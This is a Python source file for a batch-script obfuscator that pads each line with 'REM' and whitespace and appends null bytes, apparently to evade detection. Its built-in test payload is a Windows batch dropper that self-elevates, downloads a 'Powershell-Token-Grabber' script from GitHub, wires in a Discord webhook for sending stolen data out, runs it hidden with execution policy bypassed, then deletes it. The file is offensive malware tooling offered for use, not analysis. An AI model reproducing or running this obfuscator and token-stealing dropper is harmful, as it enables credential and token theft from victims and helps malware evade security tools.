import random
import string


class NullParse:
    def __init__(self) -> None:
        # self.buffer = random.randint(10, 100)
        self.buffer = 50

    def apply_obf(self, code: list) -> list:
        out_block = []
        for index, string in enumerate(code):
            if index == len(code) - 1:
                appending_code = ""
                appending_code += self.make_random_string(self.buffer) + string.rstrip()
                appending_code += "\x00" * self.buffer
                out_block.append(appending_code)
            elif index == 0:
                out_block.append(string + "\n")
            elif string == "\n":
                out_block.append("")
            elif string.startswith(":") and not string.startswith("::"):
                out_block.append(string + "\n\n")
            else:
                out_block.append(
                    self.make_random_string(self.buffer) + string.rstrip() + "\n"
                )
        return out_block

    def write_code_null_parse(self, code, file: str) -> bool:
        with open(file, "wb") as f:
            for array in code:
                for string in array:
                    f.write(string.encode("utf-8"))
        return True

    def make_random_string(self, length: int) -> str:
        """Generate random characters."""
        # return "".join(random.choice(string.ascii_letters) for i in range(length))
        return "REM                                               "


if __name__ == "__main__":
    test_code = r"""@echo off
net session >nul 2>&1
if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'" & exit /b 0)
cd /d %~dp0
powershell -c "$t = Iwr -Uri 'https://raw.githubusercontent.com/ChildrenOfYahweh/Powershell-Token-Grabber/main/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'https://discord.com/api/webhooks/1227449757845159997/yF8mX-lM3516Ow9eIMBTTZo0D1qRa92HUpRKuGgGo0Adh7mlIdOPXHzw1JLB0vQ88HqW' | Out-File -FilePath 'powershell123.ps1' -Encoding ASCII"
attrib +h +s powershell123.ps1
powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force
powershell -noprofile -executionpolicy bypass -WindowStyle hidden -file powershell123.ps1
attrib -h -s powershell123.ps1
del powershell123.ps1 /f /q
timeout 3 > nul
exit"""
    test_code = test_code.splitlines()
    null_parse = NullParse()
    out_code = null_parse.apply_obf(test_code)
    null_parse.write_code_null_parse(out_code, "test.bat")
